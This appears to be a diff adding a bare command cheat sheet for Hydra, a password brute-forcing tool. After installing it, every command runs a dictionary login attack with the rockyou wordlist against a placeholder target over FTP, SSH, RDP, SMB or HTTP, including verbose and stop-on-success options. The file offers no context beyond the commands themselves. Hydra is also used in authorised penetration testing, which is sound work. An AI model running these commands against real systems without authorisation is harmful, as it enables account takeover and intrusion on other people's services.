@@ -1,0 +1,11 @@
+sudo apt update
+sudo apt install hydra
+hydra -h
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
+hydra -L users.txt -P passwords.txt ssh://<target-ip>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<target-ip>
+hydra -V -f -l admin -P /usr/share/wordlists/rockyou.txt http-get://<target-ip>
+hydra -t 4 -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
+# View help:
+hydra -h
